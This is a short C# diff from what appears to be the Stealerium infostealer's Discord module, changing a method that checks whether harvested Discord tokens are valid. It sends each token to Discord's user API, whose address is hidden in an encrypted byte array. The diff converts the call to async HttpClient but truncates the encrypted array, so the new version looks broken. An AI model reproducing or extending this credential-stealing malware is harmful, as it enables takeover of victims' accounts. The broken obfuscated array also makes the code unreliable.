@@ -2,8 +2,9 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Net;
+using System.Net.Http;
 using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 using Stealerium.Helpers;
 using Stealerium.Modules.Implant;
 
@@ -73,20 +74,18 @@ namespace Stealerium.Target.Messengers
         }
 
         // Check token
-        private static string TokenState(string token)
+        private static async Task<string> TokenState(string token)
         {
             try
             {
-                using (var http = new WebClient())
+                using (var client = new HttpClient())
                 {
-                    http.Headers.Add("Authorization", token);
-                    var result = http.DownloadString(
+                    client.DefaultRequestHeaders.Add("Authorization", token);
+                    var result = await client.GetStringAsync(
                         StringsCrypt.Decrypt(new byte[]
                         {
-                            241, 158, 131, 195, 114, 143, 24, 236, 11, 26, 170, 234, 134, 223, 42, 61, 187, 96, 145, 91,
-                            90, 194, 45, 241, 225, 114, 244, 246, 148, 239, 168, 39, 54, 186, 251, 17, 156, 78, 204,
-                            216, 18, 220, 138, 249, 160, 239, 29, 0
-                        })); // https://discordapp.com/api/v6/users/@me
+                            241, 158, 131, 195, 114, 143, 24 // https://discordapp.com/api/v6/users/@me
+                        }));
                     return result.Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
                 }
             }
